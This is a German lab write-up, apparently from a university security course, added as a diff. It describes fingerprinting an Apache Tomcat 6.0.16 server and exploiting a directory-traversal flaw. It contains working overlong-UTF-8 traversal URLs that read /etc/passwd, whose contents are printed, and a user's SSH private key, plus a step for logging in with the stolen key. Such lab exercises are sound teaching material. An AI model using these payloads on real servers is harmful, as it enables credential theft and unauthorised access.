@@ -1,0 +1,57 @@
+1.) Portforwarding
+Unter Windows => Open CygWin => setup port forwarding
+ssh -N -p 12345 0702077@sela.inso.tuwien.ac.at -L 88:192.168.20.100:8000
+Richtet ein Portforwarding auf den Tomcat Server ein
+Anschließend Browser öffnen => http://localhost:88/ => "Welcome to lab1"
+
+2.) Tomcat Version herausfinden
+Rufe nicht-existente Seite auf um eine Fehlermeldung zu erhalten => http://localhost:88/some_site_that_does_not_exist.html
+=> HTTP Status 404 - Apache Tomcat/6.0.16
+gefundene Version: Apache Tomcat/6.0.16
+
+3.) (Internet-)Recherche um bekannte Sicherheitslücken dieser Version zu finden
+Z.b.: auf http://www.cvedetails.com/ => bekannte Seite für Sicherheitslücken in nahezu allen gängigen Webservern, Datenbanken, Frameworks, Programmiersprachen,...
+Liste der Lücken in Apache Tomcat/6.0.16 => vulnerability-list/vendor_id-45/product_id-887/version_id-56605/Apache-Tomcat-6.0.16.html
+Da es unser Ziel ist an weitere Zugangsdaten zu kommen suchen wir nach Attacken wie z.b. Directory Traversal, welches sich hierfür ausgezeichnet eignet.
+Tatsächlich finden wir mehrere Einträge zu Sicherheitslücken im Bezug auf Dir.Trav.
+http://www.cvedetails.com/cve/CVE-2008-5515/
+http://www.cvedetails.com/cve/CVE-2008-2370/
+https://issues.apache.org/bugzilla/show_bug.cgi?id=45417
+
+Mittels: http://localhost:88/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd
+4.) /etc/passwd auslesen
+Inhalt:
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/bin/sh
+bin:x:2:2:bin:/bin:/bin/sh
+sys:x:3:3:sys:/dev:/bin/sh
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/bin/sh
+man:x:6:12:man:/var/cache/man:/bin/sh
+lp:x:7:7:lp:/var/spool/lpd:/bin/sh
+mail:x:8:8:mail:/var/mail:/bin/sh
+news:x:9:9:news:/var/spool/news:/bin/sh
+uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
+proxy:x:13:13:proxy:/bin:/bin/sh
+www-data:x:33:33:www-data:/var/www:/bin/sh
+backup:x:34:34:backup:/var/backups:/bin/sh
+list:x:38:38:Mailing List Manager:/var/list:/bin/sh
+irc:x:39:39:ircd:/var/run/ircd:/bin/sh
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
+nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
+libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+sshd:x:101:65534::/var/run/sshd:/usr/sbin/nologin
+tomcat:x:102:104::/home/tomcat:/bin/false
+walter:x:1000:1000::/home/walter:/bin/bash
+=> 'x' => Passwörter befinden sich also nicht direct in der /etc/passwd sondern in /etc/shadow
+
+5.) /etc/shadow auslesen
+Nicht lesbar
+
+6.) Private Key des Users walter auslesen
+http://localhost:88/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa
+http://localhost:88/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/id_rsa.pub
+http://localhost:88/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/home/walter/.ssh/authorized_keys
+
+7.) Zugang als walter
+File id_rsa runterladen und ins eigene .ssh Verzeichnis speichern (in home)
